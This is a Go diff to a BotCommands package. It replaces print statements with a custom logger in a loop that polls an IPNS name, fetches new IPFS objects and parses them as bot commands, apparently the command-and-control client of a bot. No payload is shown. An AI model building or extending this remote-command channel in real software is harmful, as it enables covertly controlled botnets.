@@ -2,9 +2,9 @@ package BotCommands
 
 import (
 	sh "github.com/ipfs/go-ipfs-api"
-	"fmt"
 	"time"
 	"Constants"
+	log "FormatLog"
 )
 
 func resolveIpns(shell *sh.Shell) (chan string, chan error) {
@@ -28,27 +28,27 @@ func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
 	lastAddress := ""
 
 	for range ticker.C {
-		fmt.Println("[fetch command] starting new ticker")
+		log.Print("fetch command", "starting new ticker")
 
-		fmt.Println("[fetch command] resolving ipfs name")
+		log.Print("fetch command", "resolving ipfs name")
 		ipfsAddressCh, errCh := resolveIpns(shell)
 
 		select {
 		case ipfsAddress := <-ipfsAddressCh:
-			fmt.Println("[fetch command] name resolved")
+			log.Print("fetch command", "name resolved")
 
 			if lastAddress == ipfsAddress {
-				fmt.Println("[fetch command] without new command")
+				log.Print("fetch command", "without new command")
 
 			} else {
-				fmt.Println("[fetch command] we have new command")
+				log.Print("fetch command", "we have new command")
 
 				lastAddress = ipfsAddress
 
 				obj, err := shell.ObjectGet(ipfsAddress)
 				check(err)
 
-				fmt.Println("[fetch command] new raw command: ", obj.Data)
+				log.Print("fetch command", "new raw command: ", obj.Data)
 
 				botCommand, err := ParseBotCommand(obj.Data)
 				check(err)
@@ -57,10 +57,10 @@ func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
 			}
 
 		case err := <-errCh:
-			fmt.Println("[fetch command] error: ", err)
+			log.Print("fetch command", "error: ", err)
 
 		case <-time.After(time.Second * 30):
-			fmt.Println("[fetch command] timeout")
+			log.Print("fetch command", "timeout")
 		}
 	}
 }
